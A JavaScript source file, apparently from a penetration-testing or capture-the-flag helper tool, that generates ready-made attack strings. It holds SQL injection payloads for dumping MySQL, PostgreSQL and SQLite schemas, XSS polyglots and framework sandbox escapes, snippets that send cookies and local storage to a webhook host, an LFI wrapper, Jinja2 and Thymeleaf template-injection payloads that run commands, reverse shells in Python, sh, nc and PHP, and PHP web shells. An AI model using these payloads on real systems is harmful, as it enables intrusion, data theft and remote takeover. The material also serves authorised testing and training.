window.Payload = {}

window.Payload.SQLi = {
  spaceToComment: value => value.replace(/[^\S\r\n]+/g, '/**/'),

  polyglot: () => 'SLEEP(1) /*\' or SLEEP(1) or \'" or SLEEP(1) or "*/',

  MySQL: {
    unionSelect: ({ columns }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return (
        'union select ' +
        Array.from(Array(columns + 1).keys())
          .slice(1)
          .join(',')
      )
    },

    dumpDatabases: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (
        isNaN(columns) === true ||
        isNaN(position) === true ||
        position > columns
      ) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(schema_name)'

      return (
        'union select ' + fields.join(',') + ' from information_schema.schemata'
      )
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (
        isNaN(columns) === true ||
        isNaN(position) === true ||
        position > columns
      ) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(table_name)'

      return (
        'union select ' +
        fields.join(',') +
        ' from information_schema.tables where table_schema=database()'
      )
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (
        isNaN(columns) === true ||
        isNaN(position) === true ||
        position > columns
      ) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(column_name)'

      return (
        'union select ' +
        fields.join(',') +
        ' from information_schema.columns where table_schema=database()'
      )
    },

    // PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/
    dumpInOneShot: () =>
      "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",

    dumpCurrentQueries: () =>
      '(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a)',

    errorBased: () => {
      return 'extractvalue(0x0a,concat(0x0a,(select database())))'
    },
  },

  PostgreSQL: {
    unionSelect: ({ columns }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' + Array(columns).fill('null').join(',')
    },

    dumpDatabases: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (
        isNaN(columns) === true ||
        isNaN(position) === true ||
        position > columns
      ) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(datname, ',')"

      return 'union select ' + fields.join(',') + ' from pg_database'
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (
        isNaN(columns) === true ||
        isNaN(position) === true ||
        position > columns
      ) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(tablename, ',')"

      return (
        ' union select ' +
        fields.join(',') +
        " from pg_tables where schemaname='public'"
      )
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (
        isNaN(columns) === true ||
        isNaN(position) === true ||
        position > columns
      ) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(column_name, ',')"

      return (
        'union select ' +
        fields.join(',') +
        " from information_schema.columns where table_schema='public'"
      )
    },

    errorBased: () => {
      return 'cast(version() as int)'
    },
  },
  SQLite: {
    unionSelect: ({ columns }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return (
        'union select ' +
        Array.from(Array(columns + 1).keys())
          .slice(1)
          .join(',')
      )
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (
        isNaN(columns) === true ||
        isNaN(position) === true ||
        position > columns
      ) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(name)'

      return (
        'union select ' +
        fields.join(',') +
        " from sqlite_master WHERE type='table'"
      )
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (
        isNaN(columns) === true ||
        isNaN(position) === true ||
        position > columns
      ) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(sql)'

      return (
        'union select ' +
        fields.join(',') +
        " from sqlite_master WHERE type='table'"
      )
    },
  },
}

window.Payload.XSS = {
  polyglot: () =>
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',

  Vue: {
    vue2Interpolation: () => '{{_c.constructor`alert()`()}}',
    vue2Directive: () => '<x/v-=_c.constructor`alert()`()>',
    vue3Interpolation: () => '{{$emit.constructor`alert()`()}}',
    vue3DynamicComponent: () => '<component is=script text=alert()>',
  },

  AngularJS: {
    angularJS1_6WithPrototype$on: () =>
      '<div ng-app ng-csp>{{$on.curry.call().alert()}}</div>',
    // Author: Gareth Heyes (PortSwigger)
    angularJSWith$event: () =>
      '<div ng-app ng-csp><input autofocus ng-focus="$event.path|orderBy:\'[].constructor.from([1], alert)\'"></div>',
  },

  snippets: {
    getSamesiteFlag: () =>
      'fetch(`/flag`).then(t=>t.text()).then(t=>location=`https://webhook/?f=`+encodeURIComponent(t))',
    getCookieFlag: () =>
      'location=`https://webhook/?f=`+encodeURIComponent(document.cookie)',
    getStorageFlag: () =>
      'location=`https://webhook/?f=`+encodeURIComponent(localStorage.flag)',
  },
}

window.Payload.LFI = {
  phpWrapperBas64: value =>
    'php://filter/convert.base64-encode/resource=' + value,
}

window.Payload.SSTI = {
  Jinja2: {
    tuple2AllSubclasses: () => '{{().__class__.__base__.__subclasses__()}}',
    tuple2RCE: () =>
      "{%for(x)in().__class__.__base__.__subclasses__()%}{%if'war'in(x).__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}",
    g2RCE: () =>
      "{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    urlFor2RCE: () =>
      "{{url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    application2RCE: () =>
      "{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    // config2RCE Reference: https://twitter.com/realgam3/status/1184747565415358469
    config2RCE: () =>
      "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
    getFlashedMessages2RCE: () =>
      "{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    self2RCE: () =>
      "{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    lipsum2RCE: () =>
      "{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    cycler2RCE: () =>
      "{{cycler.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    joiner2RCE: () =>
      "{{joiner.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    namespace2RCE: () =>
      "{{namespace.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    addUrlRule: () =>
      "{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}",
    // TODO: add features to bypass filter keywords like __ '' "" []
  },
  Java: {
    thymeleafRCE: ({ host, port }) =>
      `__\${T(java.lang.Runtime).getRuntime().exec("nc ${host} ${port} -e sh")}__::.x`,
    commonRCE: () => "${T(java.lang.Runtime).getRuntime().exec('ls')}",
  },
}

window.Payload.Shell = {
  Python: {
    py3: ({ host, port }) =>
      `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${host}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
    py: ({ host, port }) =>
      `python -c 'import os,pty,socket;s=socket.socket();s.connect(("${host}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
  },
  sh: {
    withI: ({ host, port }) => `sh -i >& /dev/tcp/${host}/${port} 0>&1`,
    withoutI: ({ host, port }) =>
      `0<&196;exec 196<>/dev/tcp/${host}/${port};sh <&196 >&196 2>&196`,
  },
  nc: {
    withE: ({ host, port }) => `nc -e /bin/sh ${host} ${port}`,
    withC: ({ host, port }) => `nc -c bash ${host} ${port}`,
  },
  php: {
    reverseShell: ({ host, port }) =>
      `php -r '$sock=fsockopen("${host}",${port});exec("sh <&3 >&3 2>&3");'`,
    webshellEval: () => '<?=eval($_GET[_]);',
    webshellExec: () => '<?=exec($_GET[_]);',
    webshellSystem: () => '<?=system($_GET[_]);',
    webshellBackquote: () => '<?=`$_GET[_]`;',
    webshellAllFunction: () => '<?=($_GET[ÿ])($_GET[_]);',
    webshellNoAlphabetsDigits: () =>
      '<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);',
  },
}
